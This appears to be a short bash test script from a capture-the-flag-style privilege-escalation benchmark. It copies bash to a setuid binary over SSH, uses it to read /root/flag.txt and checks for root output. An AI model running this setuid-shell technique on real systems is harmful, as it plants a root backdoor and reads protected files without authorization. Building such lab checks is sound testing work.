#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cp /bin/bash /opt/bench/setcap-bin
/usr/bin/python3 -c "import os; os.chmod(\"/opt/bench/setcap-bin\", 0o4755)"
/opt/bench/setcap-bin -p -c "cat /root/flag.txt"
')"
assert_root_output "${out}"
